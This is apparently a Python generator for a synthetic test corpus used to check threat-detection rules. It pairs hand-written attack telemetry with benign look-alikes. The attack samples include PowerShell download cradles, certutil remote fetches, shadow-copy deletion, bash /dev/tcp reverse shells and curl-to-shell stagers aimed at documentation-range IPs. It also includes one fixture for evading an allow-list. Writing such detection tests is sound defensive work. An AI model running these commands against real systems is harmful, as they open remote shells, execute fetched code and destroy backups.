"""Generate the SYNTHETIC labeled sample corpus in examples/corpus/.

Every event below was written by hand for this project to resemble real telemetry
(Sysmon-style process creation, ECS-style proxy logs, Okta System Log). None of it was
captured from a real environment; hostnames use reserved example domains (RFC 2606) and IPs come from
documentation ranges (RFC 5737) or private ranges. Re-run to regenerate; a test checks that
the committed files match this script's output.

    python scripts/make_sample_corpus.py
"""

from __future__ import annotations

import base64
import json
from pathlib import Path

OUT = Path(__file__).resolve().parent.parent / "examples" / "corpus"

WIN = {"product": "windows", "category": "process_creation"}
LNX = {"product": "linux", "category": "process_creation"}
PROXY = {"category": "proxy"}
OKTA = {"product": "okta", "service": "okta"}

PS = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
PWSH = "C:\\Program Files\\PowerShell\\7\\pwsh.exe"


def enc(script: str) -> str:
    """What -EncodedCommand takes: base64 of the UTF-16LE script."""
    return base64.b64encode(script.encode("utf-16-le")).decode()


def win(fid, image, cli, parent="C:\\Windows\\explorer.exe", expect=(), note="", **extra):
    ev = {"Image": image, "CommandLine": cli, "ParentImage": parent,
          "User": "CORP\\j.doe", "Computer": "WS-0142.corp.example", **extra}
    return {"id": fid, "logsource": WIN, "event": ev, "expect": list(expect), "note": note}


def lnx(fid, image, cli, parent="/usr/bin/bash", user="deploy", expect=(), note=""):
    ev = {"Image": image, "CommandLine": cli, "ParentImage": parent, "User": user,
          "Hostname": "app-07.corp.example"}
    return {"id": fid, "logsource": LNX, "event": ev, "expect": list(expect), "note": note}


def proxy(fid, host, path, ua, dst_ip, method="GET", expect=(), note=""):
    ext = path.rsplit(".", 1)[-1].lower() if "." in path.rsplit("/", 1)[-1] else ""
    ev = {"url": {"domain": host, "path": path, "original": f"http://{host}{path}"},
          "http": {"request": {"method": method}, "response": {"status_code": 200}},
          "user_agent": {"original": ua}, "destination": {"ip": dst_ip},
          "source": {"ip": "10.20.4.17"}}
    if ext:
        ev["url"]["extension"] = ext
    return {"id": fid, "logsource": PROXY, "event": ev, "expect": list(expect), "note": note}


def okta(fid, event_type, result="SUCCESS", actor="admin.ops@corp.example",
         target="m.lee@corp.example", expect=(), note=""):
    ev = {"eventType": event_type, "outcome": {"result": result},
          "actor": {"alternateId": actor, "type": "User"},
          "target": [{"alternateId": target, "type": "User"}],
          "client": {"ipAddress": "198.51.100.23"}}
    return {"id": fid, "logsource": OKTA, "event": ev, "expect": list(expect), "note": note}


UA_PS51 = "Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.4648"
UA_PS7 = "Mozilla/5.0 (Windows NT 10.0; Microsoft Windows 10.0.19045; en-US) PowerShell/7.4.6"
UA_EDGE = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
           "Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0")

CRADLE = "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.50/a.ps1')"
CRADLE_IWR = "$x = Invoke-WebRequest -Uri https://203.0.113.51/s -UseBasicParsing; iex $x.Content"
BENIGN_ENC = "Get-Service | Where-Object Status -eq Running | Select-Object -First 5"

CORPUS = {
    "windows.jsonl": [
        # --- encoded PowerShell
        win("win-0001", PS, f"powershell.exe -NoP -W Hidden -enc {enc(CRADLE)}",
            parent="C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
            expect=["win_ps_encoded_command", "win_ps_hidden_cradle_b64"],
            note="macro-launched cradle, encoded"),
        win("win-0002", PWSH, f"pwsh /EncodedCommand {enc(CRADLE_IWR)}",
            expect=["win_ps_encoded_command", "win_ps_hidden_cradle_b64"],
            note="pwsh 7, slash flag, Invoke-WebRequest variant"),
        win("win-0003", PS, f"powershell -ec {enc(BENIGN_ENC)} ",
            parent="C:\\Windows\\System32\\cmd.exe", expect=["win_ps_encoded_command"],
            note="-ec short form; payload itself is harmless, the encoding is the signal"),
        win("win-0004", PS, f"powershell.exe -e {enc(CRADLE)}",
            expect=["win_ps_encoded_command", "win_ps_hidden_cradle_b64"],
            note="KNOWN GAP: '-e' shortest prefix is not in the rule; baseline records this FN"),
        win("win-0101", PS, f"powershell.exe -NoLogo -enc {enc(BENIGN_ENC)} ",
            parent="C:\\Windows\\CCM\\CcmExec.exe",
            note="benign: SCCM client runs encoded compliance scripts (the reason filter_sccm exists)"),
        win("win-0102", PS, "powershell.exe -ExecutionPolicy Bypass -File C:\\IT\\inventory.ps1",
            note="benign: IT script by path, no encoding"),
        win("win-0103", "C:\\Windows\\System32\\notepad.exe", "notepad.exe C:\\Users\\j.doe\\notes -enc .txt",
            note="benign look-alike: '-enc' in a non-PowerShell command line"),
        # --- certutil
        win("win-0201", "C:\\Windows\\System32\\certutil.exe",
            "certutil.exe -urlcache -split -f http://203.0.113.50/p.txt C:\\Users\\Public\\p.exe",
            parent="C:\\Windows\\System32\\cmd.exe", expect=["win_certutil_remote_fetch"],
            note="classic LOLBin download", OriginalFileName="CertUtil.exe"),
        win("win-0202", "C:\\Users\\Public\\cu.exe",
            "cu.exe /urlcache /f https://203.0.113.52/x.bin x.bin",
            expect=["win_certutil_remote_fetch"],
            note="renamed certutil caught by OriginalFileName; slash flags", OriginalFileName="CertUtil.exe"),
        win("win-0203", "C:\\Windows\\System32\\certutil.exe",
            "certutil -verifyctl -f -split https://203.0.113.53/payload",
            expect=["win_certutil_remote_fetch"], OriginalFileName="CertUtil.exe",
            note="-verifyctl variant"),
        win("win-0301", "C:\\Windows\\System32\\certutil.exe", "certutil.exe -hashfile setup.msi SHA256",
            OriginalFileName="CertUtil.exe", note="benign: integrity check before install"),
        win("win-0302", "C:\\Windows\\System32\\certutil.exe",
            "certutil -urlcache * delete", OriginalFileName="CertUtil.exe",
            note="benign look-alike: clearing the URL cache, no URL"),
        win("win-0303", "C:\\Windows\\System32\\certutil.exe",
            "certutil -verify -urlfetch C:\\certs\\issuing-ca.cer", OriginalFileName="CertUtil.exe",
            note="benign: chain check with -urlfetch (not -urlcache)"),
        # --- shadow copies
        win("win-0401", "C:\\Windows\\System32\\vssadmin.exe", "vssadmin.exe Delete Shadows /All /Quiet",
            parent="C:\\Users\\Public\\enc.exe", expect=["win_shadow_copy_wipe"],
            note="ransomware pre-encryption step"),
        win("win-0402", "C:\\Windows\\System32\\wbem\\WMIC.exe", "wmic shadowcopy delete /nointeractive",
            expect=["win_shadow_copy_wipe"], note="wmic variant, mixed case image"),
        win("win-0501", "C:\\Windows\\System32\\vssadmin.exe", "vssadmin list shadows",
            note="benign: admin listing snapshots"),
        win("win-0502", "C:\\Windows\\System32\\wbem\\WMIC.exe", "wmic shadowcopy list brief",
            note="benign: listing via wmic"),
        win("win-0503", "C:\\Program Files\\Backup\\agent.exe", "agent.exe --delete-old-shadows --keep 7",
            note="benign look-alike: backup agent pruning, not vssadmin/wmic"),
    ],
    "linux.jsonl": [
        lnx("lnx-0001", "/usr/bin/bash", "bash -c 'bash -i >& /dev/tcp/203.0.113.60/4444 0>&1'",
            parent="/usr/sbin/apache2", user="www-data", expect=["lnx_devtcp_reverse_shell"],
            note="reverse shell from a web server worker"),
        lnx("lnx-0002", "/bin/sh", "sh -c 'exec 5<>/dev/tcp/203.0.113.61/443; cat <&5 | sh >&5'",
            user="www-data", expect=["lnx_devtcp_reverse_shell"], note="fd-5 variant"),
        lnx("lnx-0003", "/usr/bin/bash", "bash -c 'sh -i >& /dev/udp/203.0.113.62/53 0>&1'",
            expect=["lnx_devtcp_reverse_shell"], note="UDP variant"),
        lnx("lnx-0101", "/usr/bin/bash",
            "bash -c 'timeout 1 bash -c \"echo > /dev/tcp/db-01.corp.example/5432\"'",
            user="monitor", note="benign look-alike: TCP port health check, plain '>' only"),
        lnx("lnx-0102", "/usr/bin/bash", "bash -c 'make test 2>&1 | tee build.log'",
            note="benign: fd redirection without /dev/tcp"),
        # --- curl | sh
        lnx("lnx-0201", "/usr/bin/bash", "bash -c 'curl -fsSL http://203.0.113.63/x.sh | bash'",
            user="www-data", expect=["lnx_fetch_pipe_shell"], note="stager"),
        lnx("lnx-0202", "/usr/bin/bash", "bash -c 'wget -qO- https://203.0.113.64/i | sudo sh'",
            expect=["lnx_fetch_pipe_shell"], note="wget + sudo"),
        lnx("lnx-0203", "/usr/bin/bash", "bash -c 'curl -s https://raw.example.net/m.sh|sh'",
            expect=["lnx_fetch_pipe_shell"], note="no spaces around pipe"),
        lnx("lnx-0204", "/usr/bin/bash",
            "bash -c 'curl -s http://203.0.113.65/x.sh | sh # https://repo.corp.example/'",
            user="www-data", expect=["lnx_fetch_pipe_shell"],
            note="evasion fixture: attacker appends an allow-listed string as a shell comment"),
        lnx("lnx-0301", "/usr/bin/bash",
            "bash -c 'curl -fsSL https://get.example.com/install.sh -o install.sh'",
            note="benign: download to file for review, no pipe"),
        lnx("lnx-0302", "/usr/bin/bash", "bash -c 'curl -s https://api.example.com/v1/health | jq .status'",
            note="benign look-alike: piped into jq, not a shell"),
        lnx("lnx-0303", "/usr/bin/bash",
            "bash -c 'curl -s https://repo.corp.example/bootstrap/node.sh | sh'", user="ansible",
            note="benign: internal bootstrap from the corp repo. KNOWN FP in the baseline until tuned"),
    ],
    "proxy.jsonl": [
        proxy("px-0001", "203.0.113.70", "/dl/update.exe", UA_EDGE, "203.0.113.70",
              expect=["proxy_binary_from_bare_ip"], note="exe from bare external IP"),
        proxy("px-0002", "198.51.100.71:8080", "/a/stage.ps1", UA_PS51, "198.51.100.71",
              expect=["proxy_binary_from_bare_ip", "proxy_powershell_ua_external"],
              note="script from IP:port, fetched by PowerShell"),
        proxy("px-0003", "203.0.113.72", "/x/doc.HTA", UA_EDGE, "203.0.113.72",
              expect=["proxy_binary_from_bare_ip"], note="upper-case extension"),
        proxy("px-0101", "10.30.0.5", "/software/agent.msi", UA_EDGE, "10.30.0.5",
              note="benign: internal software share by IP"),
        proxy("px-0102", "downloads.example.com", "/tools/setup.exe", UA_EDGE, "192.0.2.80",
              note="benign look-alike: exe from a named host"),
        proxy("px-0103", "203.0.113.73", "/status.json", UA_EDGE, "203.0.113.73",
              note="benign look-alike: bare IP, non-executable content"),
        proxy("px-0201", "paste.example.org", "/raw/9f8e7d", UA_PS7, "192.0.2.81",
              expect=["proxy_powershell_ua_external"], note="pwsh 7 pulling a raw paste"),
        proxy("px-0202", "cdn.example.net", "/payload.txt", UA_PS51, "192.0.2.82",
              expect=["proxy_powershell_ua_external"], note="Windows PowerShell 5.1"),
        proxy("px-0301", "intranet.corp.example", "/api/inventory", UA_PS51, "10.30.0.9",
              note="benign: internal API from an admin script (filter_corp)"),
        proxy("px-0302", "www.example.com", "/blog/powershell-tips", UA_EDGE, "192.0.2.83",
              note="benign look-alike: browsing an article about PowerShell"),
    ],
    "okta.jsonl": [
        okta("okta-0001", "user.mfa.factor.reset_all", actor="it.temp42@corp.example",
             expect=["okta_mfa_factor_removed"], note="all factors reset by a newly created admin"),
        okta("okta-0002", "user.mfa.factor.deactivate", actor="m.lee@corp.example",
             expect=["okta_mfa_factor_removed"], note="user deactivates own factor from a new IP"),
        okta("okta-0101", "user.mfa.factor.deactivate", result="FAILURE",
             note="benign: failed attempt (not a change); a separate brute-force rule would cover it"),
        okta("okta-0102", "user.mfa.factor.activate", note="benign look-alike: enrolment, not removal"),
        okta("okta-0103", "user.mfa.factor.reset_all", actor="helpdesk.bot@corp.example",
             note="benign: help-desk reset for a lost phone. KNOWN FP accepted in the baseline"),
        okta("okta-0201", "user.account.privilege.grant", actor="it.temp42@corp.example",
             target="it.temp42@corp.example", expect=["okta_admin_privilege_granted"],
             note="self-escalation"),
        okta("okta-0202", "group.privilege.grant", expect=["okta_admin_privilege_granted"],
             note="admin role granted to a group"),
        okta("okta-0301", "user.account.privilege.grant", result="DENY",
             note="benign: denied attempt"),
        okta("okta-0302", "user.account.privilege.revoke", note="benign look-alike: role removed"),
        okta("okta-0303", "user.session.start", note="benign: ordinary sign-in"),
    ],
}


def render() -> dict[str, str]:
    out = {}
    for name, rows in CORPUS.items():
        lines = ["// SYNTHETIC sample data generated by scripts/make_sample_corpus.py; not real telemetry."]
        for r in rows:
            r = {k: v for k, v in r.items() if v not in ([], "")}
            lines.append(json.dumps(r, ensure_ascii=False))
        out[name] = "\n".join(lines) + "\n"
    return out


def main() -> None:
    OUT.mkdir(parents=True, exist_ok=True)
    for name, text in render().items():
        (OUT / name).write_text(text, encoding="utf-8")
        print(f"wrote {OUT / name}")


if __name__ == "__main__":
    main()
